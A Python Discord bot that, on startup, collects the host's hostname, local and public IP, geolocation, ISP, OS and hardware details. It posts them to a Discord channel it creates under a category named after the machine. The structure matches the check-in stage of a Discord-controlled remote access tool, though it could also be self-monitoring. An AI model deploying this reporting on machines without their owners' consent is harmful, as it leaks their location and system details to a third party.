import configparser
import socket
import platform
import psutil
import requests
import discord
from discord.ext import commands
import subprocess
import wmi


config_file_path = 'config.ini'
config = configparser.ConfigParser()
config.read(config_file_path)

BOT_TOKEN = config['Settings']['token']
GUILD_ID = config['Settings']['server_id']
GUILD_ID = int(GUILD_ID)

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
bot = commands.Bot(command_prefix="!", intents=intents)


def get_system_info():
    # Local Hostname and IP Address
    hostname = socket.gethostname()
    try:
        local_ip_address = socket.gethostbyname(hostname)
    except socket.gaierror:
        local_ip_address = "Unable to get local IP Address"

    # Fetch public IP and other details from ipinfo.io
    try:
        response = requests.get("https://ipinfo.io/json")
        if response.status_code == 200:
            ip_info = response.json()
            public_ip = ip_info.get("ip", "N/A")
            city = ip_info.get("city", "N/A")
            region = ip_info.get("region", "N/A")
            country = ip_info.get("country", "N/A")
            org = ip_info.get("org", "N/A")
        else:
            public_ip, city, region, country, org = ["N/A"] * 5
    except requests.RequestException:
        public_ip, city, region, country, org = ["N/A"] * 5

    # Platform Information
    system = platform.system()
    release = platform.release()
    version = platform.version()
    machine = platform.machine()
    processor = platform.processor()

    # CPU Information
    cpu_count = psutil.cpu_count(logical=True)
    cpu_physical_cores = psutil.cpu_count(logical=False)
    cpu_freq = psutil.cpu_freq().current if psutil.cpu_freq() else "Unknown"

    # Memory Information
    virtual_mem = psutil.virtual_memory()
    total_memory = virtual_mem.total / (1024 ** 3)  # Convert to GB

    # Disk Information
    disk_info = psutil.disk_usage('/')
    total_disk = disk_info.total / (1024 ** 3)  # Convert to GB

    # Return information as a formatted string
    info = (
        f"**Local Hostname:** {hostname}\n"
        f"**Local IP Address:** {local_ip_address}\n"
        f"**Public IP Address:** {public_ip}\n"
        f"**Location:** {city}, {region}, {country}\n"
        f"**Organization:** {org}\n"
        f"**Operating System:** {system} {release}\n"
        f"**OS Version:** {version}\n"
        f"**Machine:** {machine}\n"
        f"**Processor:** {processor}\n"
        f"**CPU Count:** {cpu_count} (Physical: {cpu_physical_cores})\n"
        f"**CPU Frequency:** {cpu_freq} MHz\n"
        f"**Total Memory:** {total_memory:.2f} GB\n"
        f"**Total Disk Space:** {total_disk:.2f} GB"
    )
    return hostname, info

@bot.event
async def on_ready():
    print(f"{bot.user} has connected to Discord!")
    guild = discord.utils.get(bot.guilds, id=GUILD_ID)
    print("getting info")
    # Get system info
    hostname, system_info = get_system_info()

    # Check if category exists, else create it
    category = discord.utils.get(guild.categories, name=hostname)
    print("Creating category.")
    if not category:
        category = await guild.create_category(name=hostname)
        print(f"Created new category: {hostname}")

    # Create a channel under the new category
    channel_name = f"{hostname}-info"
    channel = discord.utils.get(category.channels, name=channel_name)
    if not channel:
        channel = await category.create_text_channel(name=channel_name)
        print(f"Created new channel: {channel_name}")

    # Send system information to the channel
    await channel.send(system_info)


bot.run(BOT_TOKEN)